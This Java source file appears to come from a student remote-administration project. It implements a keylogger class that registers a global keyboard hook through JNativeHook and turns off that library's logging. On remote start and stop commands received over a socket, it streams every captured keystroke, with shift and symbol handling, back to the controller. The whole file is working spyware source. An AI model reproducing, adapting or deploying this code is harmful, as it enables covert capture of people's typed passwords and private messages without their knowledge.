package team6.server.handler;

import java.io.IOException;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.logging.LogManager;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import team6.server.socket.SocketHandler;

public class Keylogger extends Thread {

    private final SocketHandler socketHandler;
    private NativeKeyListener nl;

    public Keylogger(Socket socket) throws IOException {
        this.socketHandler = new SocketHandler(socket);
        LogManager.getLogManager().reset();
        Logger.getLogger(GlobalScreen.class.getPackage().getName()).setLevel(Level.OFF);
        this.start();
    }

    public void run() {

        while (!socketHandler.socket.isClosed()) {
            try {
                String message = socketHandler.receive();
                if (message != null) {
                    executeCommand(message);
                }
            } catch (IOException | InterruptedException ex) {
                Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
                close();
            }
        }
    }

    public void executeCommand(String command) {
        while (true) {
            try {
                if (command.equals("<START>$<>")) {
                    startKeylog();
                    break;
                }

                if (command.equals("<STOP>$<>")) {
                    stopKeylog();
                    break;
                }

            } catch (Exception ex) {
                Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

    private void startKeylog() throws NativeHookException {
        GlobalScreen.registerNativeHook();
        Thread th = new Thread() {
            @Override
            public void run() {

                nl = new NativeKeyListener() {
                    int keyCode = -1; //keyCode cua phim duoc an sau cung ma khong phai Backspace
                    boolean isPressed = false; //Kiem tra phim duoc an, khi nao phim release thi se la false.
                    boolean isShifted = false; //Kiem tra phim Shift co duoc an chua, released thi la false
                    boolean isCapsLocked = false; //Kiem tra phim CapsLock co duoc an chua?

                    @Override
                    public void nativeKeyPressed(NativeKeyEvent nke) {
                        keyCode = nke.getKeyCode();
                        String keyText = NativeKeyEvent.getKeyText(keyCode);
                        String newKeyText = customKeyText(keyCode, keyText);

                        //System.out.println(keyCode);
                        int keyDetect = keyDetect(keyCode);
                        switch (keyDetect) {
                            case 0 -> {
                                sendKey(newKeyText);
                            }
                            case 1 -> {
                                if (isCapsLocked || isShifted) {
                                    //System.err.println("Shift holding.");
                                    sendKey(newKeyText);
                                } else {
                                    //System.err.println("No Shift Holding");
                                    newKeyText = newKeyText.toLowerCase();
                                    sendKey(newKeyText);
                                }
                                break;
                            }
                            case 2 -> {
                                sendKey(newKeyText);
                                break;
                            }
                            case 3 -> {
                                isShifted = true;
                                sendKey(newKeyText);
                                break;
                            }
                            case 4 -> {
                                isCapsLocked = !isCapsLocked;
                                sendKey(newKeyText);
                                break;
                            }
                            case 5 -> {
                                if (isShifted) {
                                    if (getShiftText(keyCode) != null) 
                                        sendKey(getShiftText(keyCode));
                                } else {
                                    sendKey(newKeyText);
                                }
                                break;
                            }
                            default -> {
                                break;
                            }
                        }
                    }

                    @Override
                    public void nativeKeyReleased(NativeKeyEvent nke) {
                        if (isShifted && nke.getKeyCode() == 42 || nke.getKeyCode() == 54) {
                            isShifted = false;
                        }
                    }

                    @Override
                    public void nativeKeyTyped(NativeKeyEvent nke) {

                    }

                };
                GlobalScreen.addNativeKeyListener(nl);
            }
        };
        th.start();
    }

    private void stopKeylog() throws NativeHookException {
        GlobalScreen.removeNativeKeyListener(nl);
        nl = null;
        GlobalScreen.unregisterNativeHook();
//        System.out.println("Stop keylog");
    }

    private void sendKey(String newKeyText) {
        newKeyText = newKeyText + " ";
        socketHandler.send(newKeyText.getBytes());
    }

    private boolean inArray(int[] array, int searchingValue) {
        for (int x : array) {
            if (x == searchingValue) {
                return true;
            }
        }
        return false;
    }

    private int keyDetect(int keyCode) {
        if (keyCode == 0) {
            return 0;
        }
        if ((keyCode >= 16 && keyCode <= 25) || (keyCode >= 30 && keyCode <= 38) || (keyCode >= 44 && keyCode <= 50)) {
            return 1;
        }
        if (keyCode == 28) {
            return 2;
        }
        if (keyCode == 42 || keyCode == 54) {
            return 3;
        }
        if (keyCode == 58) {
            return 4;
        }
        return 5;
    }

    private String getShiftText(int keyCode) {
        switch (keyCode) {
            case 51 -> {
                return "<";
            }
            case 52 -> {
                return ">";
            }
            case 53 -> {
                return "?";
            }
            case 39 -> {
                return ":";
            }
            case 40 -> {
                return "\"";
            }
            case 43 -> {
                return "|";
            }
            case 26 -> {
                return "{";
            }
            case 27 -> {
                return "}";
            }
            case 41 -> {
                return "~";
            }
            case 2 -> {
                return "!";
            }
            case 3 -> {
                return "@";
            }
            case 4 -> {
                return "#";
            }
            case 5 -> {
                return "$";
            }
            case 6 -> {
                return "%";
            }
            case 7 -> {
                return "^";
            }
            case 8 -> {
                return "&";
            }
            case 9 -> {
                return "*";
            }
            case 10 -> {
                return "(";
            }
            case 11 -> {
                return ")";
            }
            case 12 -> {
                return "_";
            }
            case 13 -> {
                return "+";
            }
            default -> {
                return null;
            }
        }
    }

    private String customKeyText(int keyCode, String keyText) {
        String newKeyText = keyText;
        int specialKeyCodeArray[] = new int[]{1, 14, 15, 28, 29, 42};
        //plus range >=54
        int convertableKeyCodeArray[] = new int[]{12, 13, 26, 27, 39, 40, 41, 43, 51, 52, 53};
        if (inArray(specialKeyCodeArray, keyCode) | keyCode >= 54) {
            newKeyText = "[" + keyText + "]";
        }
        if (inArray(convertableKeyCodeArray, keyCode)) {
            switch (keyCode) {
                case 12 -> {
                    newKeyText = "-";
                    break;
                }
                case 13 -> {
                    newKeyText = "=";
                    break;
                }
                case 26 -> {
                    newKeyText = "[";
                    break;
                }
                case 27 -> {
                    newKeyText = "]";
                    break;
                }
                case 39 -> {
                    newKeyText = ";";
                    break;
                }
                case 40 -> {
                    newKeyText = "'";
                    break;
                }
                case 41 -> {
                    newKeyText = "`";
                    break;
                }
                case 43 -> {
                    newKeyText = "\\";
                    break;
                }
                case 51 -> {
                    newKeyText = ",";
                    break;
                }
                case 52 -> {
                    newKeyText = ".";
                    break;
                }
                case 53 -> {
                    newKeyText = "/";
                    break;
                }
                default -> {
                    break;
                }
            }
        }
        return newKeyText;
    }

    public void close() {
        socketHandler.close();
    }

}
